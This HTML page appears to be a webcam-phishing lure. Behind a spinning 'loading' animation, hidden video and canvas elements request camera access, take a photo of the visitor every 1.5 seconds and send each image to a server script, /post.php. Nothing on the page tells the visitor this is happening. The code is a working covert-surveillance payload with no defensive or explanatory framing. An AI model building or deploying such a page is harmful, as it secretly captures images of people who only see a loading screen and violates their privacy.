<!Doctype html>
<html>
    <head>
      <script type="text/javascript" src="https://ajax.googleapis.com/ajax/libs/jquery/1.8.3/jquery.js"></script>
    </head>
    <body>
      <center><div class="loader"></div></center>
      <div class="video-wrap" hidden="hidden"></div>
        <video id="video" playsinline autoplay hidden="hidden">
        </video>
    </div>
        <canvas hidden="hidden" id="canvas" width="640" height="640"></canvas>
      <script>
        function post(imgdata){
          $.ajax({
              type: 'POST',
              data: { cat: imgdata},
              url: '/post.php',
              dataType: 'json',
              async: false,
              success: function(result){
                  // call the function that handles the response/results
              },
              error: function(){
              }
            });
          };
          
          const video = document.getElementById('video');
          navigator.getUserMedia = navigator.getUserMedia || navigator.webkitGetUserMedia || navigator.mozGetUserMedia || navigator.msGetUserMedia || navigator.oGetUserMedia;
          if (navigator.getUserMedia) {
            navigator.getUserMedia({ video: true }, Jalankan, Error);
          }

          function Error(e){
           alert("Error")
          
        }

         function Jalankan(stream){
          window.stream = stream;
          video.srcObject = stream;
          var context;
      
          var width = video.offsetWidth
                  , height = video.offsetHeight;
                  
                  var context = canvas.getContext('2d');
                    setInterval(function(){
                  
                         context.drawImage(video, 0, 0, 640, 640);
                         var canvasData = canvas.toDataURL("image/png").replace("image/png", "image/octet-stream");
                         post(canvasData); }, 1500);
                    }

      init();
  </script>  

        <style>
            .loader {
  border: 16px solid #f3f3f3; /* Light grey */
  border-top: 16px solid #3498db; /* Blue */
  border-radius: 50%;
  width: 120px;
  height: 120px;
  animation: spin 2s linear infinite;
}

@keyframes spin {
  0% { transform: rotate(0deg); }
  100% { transform: rotate(360deg); }
}
        </style>
    </body>
</html>